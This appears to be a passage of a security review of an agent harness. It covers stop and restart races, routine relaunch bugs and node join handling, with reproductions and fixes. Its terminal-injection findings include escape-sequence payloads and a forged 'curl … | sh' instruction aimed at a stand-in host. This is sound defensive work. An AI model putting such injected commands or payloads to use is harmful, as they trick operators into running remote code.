"… Handle this ticket: {{event.text}}", one call, one SIGTERM of `serve`
while its turn runs, one start):

```
before the stop: status running, untrusted True, prompt 'slow: twenty words. Handle this ticket: TICKET-4711 refund the customer'
exit status 0
after the next start: status completed, reason None, untrusted False, prompt 'slow: twenty words. Handle this ticket: '
the stored event of the run is still on its row: "{'text': 'TICKET-4711 refund the customer', 'received_at': '2026-11-12 23:51', '"
what the new chat's turn was asked: ['slow: twenty words. Handle this ticket: ']; ends ['completed']
runs listed: 1
```

The run is shown completed. The agent was asked to handle nothing, with the
routine's tools and approval mode. On `5add735` the run was `interrupted`,
which was honest.

**Smallest fix.** The relaunch loads the row's stored event and passes it
(it is the event cut to 16 KiB, so say so in the run's warnings when it was
cut), keeping `untrusted` and the consent check; or a run with a stored
event is not put back but ended `interrupted` without being counted.

**Test.** `hooks_http.rs`: a webhook run with `{{event.text}}`, its turn
ended `stopped`, the next start: the new chat's prompt holds the text and
the run is untrusted.

#### R-2. Low (claim 4). A node stopped, then its master: the run is `interrupted` and counted

**Mechanism.** A remote node's stop ends the turn `stopped`; the master is
not stopping, so `put_back` relaunches at once; the node is still stopping
(or gone), so the launch falls to `retry_later`, which overwrites the
put-back's reason and keeps the retry in memory. A stop of the master inside
that minute (5 and 15 for the next ones) loses it; the next start finds a
`pending` run without the put-back reason and ends it.

**Reproduction.** `python3 routine_remote.py both` (a real `node run`, an
agentic routine on it):

```
the run is running on the remote node: (('running', 1, None), (0, None))
the node is stopped: exit status 0
the master's row for the run now: (('pending', 2, 'this node is stopping (…): send this again once it is back; trying again in 1 min'), (0, None))
the master is stopped: exit status 0
both are back: (('interrupted', 2, 'the server restarted before the run started'), (1, None))
```

The second pair is the routine's `consecutive_failures, paused_reason`.
Control, `routine_remote.py node` (only the node is restarted): after the
minute the run is `running` again, attempt 2, failures 0. By reading, a
node away for more than the three retries (21 min), or a routine whose next
occurrence comes before the retry, ends the run `failed`, also counted: the
absent node's rule, which `docs/routines.md` names, but "is no failure and
is not counted" is said without it.

**Smallest fix.** `retry_later` keeps the put-back mark (a column, not the
reason's text) and the start-up reconcile launches every `pending` run that
carries it; a put-back run that runs out of retries is not counted.

**Test.** `routines_http.rs` with a fake remote node: stopped end, refused
relaunch, `begin_stop`, next start: the run is launched, failures 0.

#### R-3. Low (claim 4). A stop in the moment a run is launched: `interrupted` and counted

**Mechanism.** `launch` writes the row `running` with its chat, then sends
the prompt. With no turn running anywhere the stop returns at once, HTTP
ends, `main` gives the runtime 2 s in which tasks are dropped, and the
launch's own bookkeeping (the refusal's `put_back`, or the `stopped` end's)
never runs. The next start's `reconcile_run` finds a chat with no turn and
ends the run "the run's turn stopped without finishing" (`runner.rs:1364`).

**Reproduction.** `python3 routine_stops.py launch` ("run now", SIGTERM as
soon as the row reads `running`):

```
SIGTERM in the moment the run's row first says `running`, 8 tries:
  8: exit 0; at rest: running+chat; after the next start: interrupted (the run's turn stopped without finishing); failures 1
```

The window is the prompt's way to the node (tens of milliseconds here). A
schedule and a restart on the same minute meet in it. The relaunch after a
put-back passed the same test when stopped again 0 to 400 ms after the
start listened (`routine_stops.py window`: 11 of 11 `pending` at rest,
`completed` after one more start), so the window is the launch's, not the
reconcile's.

**Smallest fix.** At start, a `running` run whose chat holds no
`turn_started` was never run: put it back instead of ending it. Or the stop
waits for launches in flight as it waits for turns.

**Test.** `routines_http.rs`: `begin_stop` between the row's `running` and
the prompt's ack; the next start completes the run, failures 0.

#### R-4. Low (T7; made by the fix). A node that ends every turn `stopped` is given the same run for ever

**Mechanism.** `put_back` relaunches at once when the master is not
stopping, does not raise `attempt`, and is not counted. Nothing bounds it:
not the retries, not the daily cap (one run), not the failure counter.

**Reproduction.** `sh run_rust_proofs.sh loop` (a protocol-level node that
acks every command and ends each turn `stopped`; one "run now"):

```
after 1 s: prompts sent for the one run: 512; chats made: 513; the run: "pending" attempt 1; runs listed: 1
after 3 s: prompts sent for the one run: 1465; chats made: 1465; the run: "pending" attempt 1; runs listed: 1
after 5 s: prompts sent for the one run: 2332; chats made: 2332; the run: "running" attempt 1; runs listed: 1
the routine: paused_reason null
2335 launches of one run in 5 s; nothing counted, nothing stops it
```

Each launch is a new chat in the owner's list and in the master's store,
about 470 a second here, until someone deletes the routine or revokes the
node. A registered node only (hostile, or with a bug in how it ends turns).

**Smallest fix.** `put_back` raises `attempt` and gives up after a few
(ending the run `interrupted`, counted then), and a relaunch that is not at
start-up goes through `retry_later`'s delays instead of at once.

**Test.** This proof with a bound: at most N prompts.

#### R-5. Low (A19-6, the part left). `node join` prints the node id its master assigns raw, and `node run` prints it again at every start

**Mechanism.** `printable` was put on the refusal and on the id logged at
"connected to master" (`client.rs:121`). `client::join` returns the id as
received; `node_join` prints it (`main.rs:772`) and writes it to
`remote.toml`, from where `node run` prints it ("node `…` connecting to").

**Reproduction.** `sh run_rust_proofs.sh reason` (a stand-in master, the
real `node join`):

```
node join: exit status Some(0) after 62.043117ms; stdout and stderr, escaped:
    joined as node `box\u{1b}[2J\u{1b}[H\n
    joined. Now run: curl https://example.invalid/fix | sh\n
    `. Start it with: rizzy-harness node run\n
ESC bytes written raw: 2
an id of 1 MiB: exit status Some(0), 1048731 bytes printed
```

**Smallest fix.** The node accepts an id only in the shape the master
itself requires (`plausible_node_id`: 1 to 64 of `a-z0-9-`) at join and at
`accepted`, and refuses anything else.

**Test.** This proof with asserts.

#### R-6. Note (A19-6). What `printable` lets through

`char::is_control` is category Cc only. The same proof with a reason that
holds U+2028, U+2029, U+202E, U+200B and a run of spaces:

```
  U+2028 reaches the node's stderr: true
  U+2029 reaches the node's stderr: true
  U+202E reaches the node's stderr: true
  U+200B reaches the node's stderr: true
  as an 80-column terminal shows the last line:
    |Error: the master refused this node: x                                          |
    |2026-11-12T00:00:00.000000Z  INFO rizzy_harness: update verified; run: curl http|
    |s://example.invalid/fix | sh\u{2028}second\u{2029}third \u{202e}desrever\u{202c} a\u{200b}b|
```

No terminal I know breaks a line at U+2028; log viewers and JavaScript do.
A right-to-left override reorders what follows it on a terminal that does
bidirectional text. Spaces alone put a forged text at the start of a row.
The master's own reasons are ASCII: keep `' '..='~'`, fold runs of spaces
into one.

#### R-7. Note (N-7, N-9). A sub-agent being started when the stop comes starts its turn after the stop and ends `cancelled`

`run_child` checks the flag first, then makes the child's folder (a git
worktree), then claims the turn. A stop in between marks and cancels the
parent; the child claims with a token already cancelled, so `mark_stopped`
leaves it. `python3 stop_child_race.py`:

```
SIGTERM d ms after the parent's `delegate` call started:
  child: started 1, ends ['cancelled']; parent: started 1, ends ['stopped']
      at 0 ms, 0 ms, 5 ms, 5 ms, 10 ms, 10 ms, 20 ms, 20 ms, 40 ms, 40 ms, 80 ms, 80 ms
  child: started 1, ends ['stopped']; parent: started 1, ends ['stopped']
      at 150 ms, 150 ms, 300 ms, 300 ms
```

Every exit 0, both turns closed once. Fix: check the flag again after the
child's claim, as `prompt` does, and refuse.

#### R-8. Note (A19-8's fix). The put-back of uploads

`python3 uploads_race.py`. (a) `attachments_give_back` does not look at the
limit: a user at 20 unsent uploads, a refused message that takes five,
five new uploads while the node is asked: `unsent uploads held after 12
refused messages: 25 (the limit is 20)`; several refused messages at once
would take more. (b) It writes the sender as owner: the API token's refused
message with a user's upload `left it owned by None`, and `alex then sends
it: 400 'unknown or already used attachment; upload it again'` (before the
fix the upload was gone; now it is there and not theirs). (c) Sent and kept:
`of 10 tries, an upload both sent and still held: 0`; an upload put back
gets a new age and is purged by it. Fix: return the original owner from
`attachments_take` and give it back to them.

#### R-9. Note (A19-1's limit). What the kept process looks like

In the state the builder describes, `stop_hang_blocking.py`:

```
exit status 8 s later: None (None: not reaped), process state 'Z', threads ['2914070[Z]', '2914425[D]']
the data directory's lock can be taken by someone else now: False
the lock file's hint: '2914070 serve' (the process: pid 2914070)
after one more SIGKILL: exit status None, state 'Z'
a second `serve` is refused: <run>/hang/data is in use by serve (pid 2914070): one data directory serves one process; stop that one first, or give this one its own --data-dir
doctor: ok    data dir lock: held by serve (pid 2914070): a second server or node on this directory is refused
the mount is released: the process is reaped with exit status 0; the lock is free: True
```

The thread is dead to user space (it never returns from the kernel), so
nothing writes after the exit. The messages tell the operator to stop a
process nothing can stop; neither says it is a zombie waiting on a mount.
The README's "the process exits 2 s after its work is done whatever threads
remain" is not what a supervisor sees: the main process is not reaped until
the read returns, so (by reading, systemd not run) `systemctl stop` waits
its 120 s, the unit ends failed with the process left, and each start until
the mount answers is refused by the lock. By reading: a panic of
`async_main` unwinds through a plain drop of the runtime, which waits for
the stuck thread with the lock held (the old hang, without the double
start); SIGKILL then gives the state above.

#### R-10. Note. A stop task that dies is read as "every turn is closed"

`serve` takes the stop's result with `stopped_rx.await.unwrap_or_default()`
(`main.rs:491`). `python3 debug_seam.py` reaches it through the debug
build's variable (`Instant + Duration` overflows):

```
HARNESS_STOP_WAIT_S unset: exit status 0 in 2.6 s; the turn at the next start: ['stopped']
HARNESS_STOP_WAIT_S = 0: exit status 1 in 0.3 s; the turn at the next start: ['interrupted']
HARNESS_STOP_WAIT_S = 18446744073709551615: exit status 0 in 0.4 s; the turn at the next start: ['interrupted']
    thread 'tokio-rt-worker' panicked at …/tokio-1.54.1/src/time/instant.rs:161:27:
    last line: stopped: every turn is closed
HARNESS_STOP_WAIT_S = 0 (in .env): exit status 1 in 0.3 s; the turn at the next start: ['interrupted']
```

The variable is read only under `#[cfg(debug_assertions)]`
(`stop.rs:50-58`); the image is built with `--release`, no profile turns
debug assertions on there, CI builds only tests. A release build was not
made here. A debug build (`cargo run`, `target/debug/rizzy-harness`) takes
it from the environment and from `.env` in the folder `serve` starts in.
Fix: a closed channel is exit 1 ("the stop did not finish"); cap the
variable.

#### R-11. Note (N-9's fix). The join's version check tells whether a token is valid without spending it

`what_a_join_of_another_protocol_tells_about_its_token`:

```
the valid token, another protocol, 30 times: rejected "this node speaks protocol 2 and the master (rizzy-harness 0.1.0) protocol 1: …"  (median 41.99 ms)
a wrong token, another protocol, 30 times: rejected "invalid or expired join token"  (median 42.02 ms)
the valid token, another protocol, a bad signature: rejected "bad signature"
after 30 refused joins, the valid token with the master's protocol: accepted
the same token again (now spent), another protocol: rejected "invalid or expired join token"
```

As designed: the token is untouched and only its holder learns the version.
It is also a test of a token that leaves no audit row and does not use it
up (a join with the right protocol tells the same by spending it). Tokens
are 32 characters; guessing is not the risk. No timing difference.

### 7.3 Attacks that held

- **The lock on every exit** (reading, and `stop_hang_blocking.py`,
  `stop_bound.py`, `signals.py second`): taken in `main` before the runtime,
  never dropped; a clean stop, the bound, an error from `async_main` and the
  second signal all end in `process::exit` with it held. `doctor`, `token`,
  `claim-code`, `graphify` take none, as before.
- **Twice or never, the put-back at start** (`routine_stops.py`): five
  stops in a row: `('pending', "the node was stopped while the run's turn
  ran; …", None)` at rest each time, failures 0, 1 run listed, then
  `completed`; six chats, each with one turn (five `stopped`, one
  `completed`). The next start stopped again 0 to 400 ms after it listened:
  11 of 11 `completed` after one more start, failures 0. The relaunch goes
  through `admit` again (the owner's account, membership, permission, the
  node's grant, the caps); by reading it does not look at `paused_reason` or
  `enabled`, so a routine paused meanwhile still runs its put-back run.
  `RunPatch` is built only in `runner.rs`; no HTTP body reaches
  `clear_chat`.
- **The refusal window again**: `restore_race.py 10`: `{'refused': 10}`;
  `stop_window.py`: prompt, session, restore 503, `allow` 409, the
  attachment sent again 200; `stop_users_routines.py`: 24 answers to another
  user, 0 differ; run now 503 and no run after the next start.
- **Races** (`stop_race.py`): 30 `allow` answers sent 0 to 3 ms before the
  signal: 23 recorded `allow by user` (each stamped within a millisecond of
  the stop's log line, some just after it: decided before the cancel
  reached the turn), 7 answered 409 and `deny by cancelled`; the command ran
  in 0 of 30, every end `stopped`, every exit 0. 96 prompts sent 150 ms
  before to 20 ms after the signal: 9 answered 200 and ended `stopped`, 87
  answered 503 with nothing recorded; `violations: 0`.
- **Each kind of turn, the second signal, the link down, commands that
  resist** (`stop_kinds.py`, `signals.py second`, `node_link.py`,
  `stop_commands.py term detach stuck`): as in section 4, line for line
  (model call, sub-agent, approval, chat, shell: `stopped` once, nothing
  added by the next start; exit 1 in 3 ms and `interrupted` once; the end
  replayed once; nothing alive after exit 0 except the stuck command's
  guard).
- **Which end** (`stop_ends.py`): the person's cancel, then SIGTERM 0.2 s
  later: `['cancelled']`; SIGTERM, then the cancel: `['stopped']`; SIGTERM
  while a finished turn's checkpoint runs (the model's last message is
  seq 10, the end not yet written): exit 0 after 22.0 s, `['completed']`.
- **The handshake** (`run_rust_proofs.sh handshake`): the table of section
  4 with one change (no version: closed, for everyone); a stranger's
  refusal: medians 41.99, 42.00, 42.17 ms for claims 1, 99, 0; the live link
  untouched by two refused handshakes; a lying `node.hello` not listed.
- **Exit 77**: `node run` refused: `exit status Some(77)`; `node join`
  refused (a stand-in master): `a refused join: exit status Some(77); it
  prints: Error: the master refused this node: this node speaks protocol 1
  and the master (rizzy-harness 9.9.9) protocol 2: …`. A node whose key is
  revoked while it runs exits 77 the same way without closing its turns (the
  link's error returns at once: by reading, as before the change).

### 7.4 Not tested

systemd and Docker (rules). A release build (not made: the seam's `cfg` and
the Dockerfile were read). A file-changing sub-agent's shell under a stop
(its command is refused here: "would expose the harness's data directory",
so `merge_back` under a stop was not reached). A stop past 80 s without the
seam. R-9's panic path and the pause of a routine before its relaunch
(reading).

### 7.5 Verdict per claim, again

1. **Holds**, on the wire and now on the node's terminal for a refusal;
   `node join` still prints a master's text raw (R-5). The unit leaves a
   refused node down.
2. **Holds.** A19-1, A19-3, A19-4, A19-5 and A19-8 are closed. What is left
   is small: a sub-agent's turn started and ended `cancelled` across the
   stop (R-7), a dead stop task read as success (R-10).
3. **Holds**: the lock goes with the process, also when the process cannot
   go (R-9 says what that looks like).
4. **Holds for the plain case only** (a schedule's run on the server's own
   runtime, cut by the server's stop). A webhook's run is run again without
   its event (R-1); node then master, and a stop at the launch, still end
   the run `interrupted` and count it (R-2, R-3); a node can have one run
   launched without end (R-4).
5. **Holds as reasoned**: 80 s + 2 s + 0.2 s + 2 s under 120 s for a node;
   80 s + 2 s + 30 s + 2 s under 150 s for the image;
   `RestartPreventExitStatus=77` matches the exit. With R-9's process the
   stop times out. Not run.
6. **Accurate except three sentences**: "runs again … once the node or the
   server is back" (R-1 to R-3), "is no failure and is not counted" (R-2,
   R-3), "the process exits 2 s after its work is done whatever threads
   remain" (R-9).

Asked for before merge: R-1 (the fix made it). R-4 with it (a counter).
R-2, R-3 and R-5 are a few lines each and should ride along or be written
into the documents.

### 7.6 Left clean

As in section 6. After the last run: no process with `review_a19` in its
command line or working directory, no `review_a19` or `t8e-stall` mount.
Seven `sleep 975xxx` were alive at that moment; their parents are the
contained commands of another worktree's `cargo test` (`t8d-…`, started by
someone else minutes before), not this review's, and they were left alone; the scratch folder is removed; no proof
copy is left in `crates/*/tests/`. `/tmp` holds about eleven thousand empty
`.tmp*` folders made at a steady rate since before this review by something
else on this machine (the newest at 00:37, when no proof of mine was
running); I did not touch them. The owner's server was only looked at.
